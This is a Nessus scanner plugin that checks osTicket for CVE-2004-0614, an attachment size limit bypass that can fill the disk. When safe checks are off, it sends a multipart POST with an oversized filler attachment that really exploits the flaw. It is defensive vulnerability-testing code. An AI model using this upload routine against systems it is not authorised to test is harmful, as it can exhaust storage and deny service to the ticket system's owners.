#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (4/21/009)

# NB: I define the script description here so I can later modify
#     it with the filename of the exploit.

include("compat.inc");

if (description) {
  script_id(13646);
  script_version ("$Revision: 1.13 $");
  script_cvs_date("$Date: 2013/01/25 01:19:09 $");
 
  script_cve_id("CVE-2004-0614");
  script_osvdb_id(15691);

  script_name(english:"osTicket Form Field Modification File Upload Size Restriction Bypass");
 
 script_set_attribute(attribute:"synopsis", value:
"It is possible to DoS the remote host through a wep application." );
 script_set_attribute(attribute:"description", value:
"The target is running at least one instance of osTicket that enables a
remote user to a open new ticket with an attachment of unlimited size. 
An attacker could exploit this vulnerability and cause a denial of
service by filling up the filesystem used for attachments." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to osTicket STS 1.2.7 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_attribute(attribute:"plugin_publication_date", value: "2004/07/14");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/06/22");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 
  summary["english"] = "Checks for Large Attachment Vulnerability in osTicket";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2004-2013 George A. Theall");

  script_family(english:"CGI abuses");

  script_dependencie("global_settings.nasl", "http_version.nasl", "osticket_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/osticket");
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

host = get_host_name();
port = get_http_port(default:80);

if (!get_port_state(port)) exit(0);

# Check each installed instance, stopping if we find a vulnerability.
installs = get_kb_list(string("www/", port, "/osticket"));
if (isnull(installs)) exit(0);
foreach install (installs) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    ver = matches[1];
    dir = matches[2];

    # If safe_checks are enabled, rely on the version number alone.
    #
    # nb: I have no clue about whether earlier versions are affected.
    if (safe_checks()) {
      if (ereg(pattern:"^1\.2\.5$", string:ver)) {
        security_warning(port);
        exit(0);
      }
    }
    else {
      # Get osTicket's open.php.
      url = string(dir, "/open.php");
      req = http_get(item:url, port:port);
      res = http_keepalive_send_recv(port:port, data:req);
      if (res == NULL) exit(0);           # can't connect

      # If the form supports attachments...
      if (egrep(pattern:'type="file" name="attachment"', string:res, icase:TRUE)) {
        #  Grab the session cookie.
        pat = "Set-Cookie: (.+); path=";
        matches = egrep(pattern:pat, string:res, icase:TRUE);
        foreach match (split(matches)) {
          match = chomp(match);
          cookie = eregmatch(pattern:pat, string:match);
          if (cookie == NULL) break;
          cookie = cookie[1];
        }

        #  Grab the max file size.
        pat = 'name="MAX_FILE_SIZE" value="(.+)"';
        matches = egrep(pattern:pat, string:res, icase:TRUE);
        foreach match (split(matches)) {
          match = chomp(match);
          max = eregmatch(pattern:pat, string:match);
          if (max == NULL) break;
          max = max[1];
        }

        # Open a ticket as long as we have a session cookie and a maximum file size.
        if (cookie && max) {
          boundary = "bound";
          req = string(
            "POST ",  url, " HTTP/1.1\r\n",
            "Host: ", host, ":", port, "\r\n",
            "Cookie: ", cookie, "\r\n",
            "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
            # nb: we'll add the Content-Length header and post data later.
          );
          boundary = string("--", boundary);
          postdata = string(
            boundary, "\r\n", 
            'Content-Disposition: form-data; name="name"', "\r\n",
            "\r\n",
            "nessus\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="email"', "\r\n",
            "\r\n",
            "postmaster@", host, "\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="phone"', "\r\n",
            "\r\n",
            "\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="cat"', "\r\n",
            "\r\n",
            "4\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="subject"', "\r\n",
            "\r\n",
            "Attachment Upload Test\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="message"', "\r\n",
            "\r\n",
            "Attempt to open a ticket and attach an excessively large attachment.\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="pri"', "\r\n",
            "\r\n",
            "1\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="MAX_FILE_SIZE"', "\r\n",
            "\r\n",
            # NB: we'll allow for double the preset max...
            max*2, "\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="attachment"; filename="big_file"', "\r\n",
            "Content-Type: application/octet-stream\r\n",
            "\r\n",
            #     but only upload a file with an extra 10%.
            crap(max*11/10), "\r\n",

            boundary, "\r\n", 
            'Content-Disposition: form-data; name="submit_x"', "\r\n",
            "\r\n",
            "Open Ticket\r\n",

            boundary, "--", "\r\n"
          );
          req = string(
            req,
            "Content-Length: ", strlen(postdata), "\r\n",
            "\r\n",
            postdata
          );
          res = http_keepalive_send_recv(port:port, data:req);
          if (res == NULL) exit(0);           # can't connect

          # Grab the ticket number that was issued.
          pat = 'name="login_ticket" .+ value="(.+)">';
          if (matches = egrep(pattern:pat, string:res, icase:TRUE)) {
            foreach match (split(matches)) {
              match = chomp(match);
              ticket = eregmatch(pattern:pat, string:match);
              if (ticket == NULL) break;
              ticket = ticket[1];
            }
            if (ticket) {
               report = strcat(
"**** Nessus successfully opened ticket #", ticket, " and uploaded
**** an attachment exceeding the maximum size as ", ticket, "_big_file to
**** osTicket's attachment directory. You are strongly encouraged to delete
**** this file as soon as possible to free up disk space.
");
              security_warning(port:port, extra:report);
              exit(0);
            }
          }
        }
      }
    }
  }
}
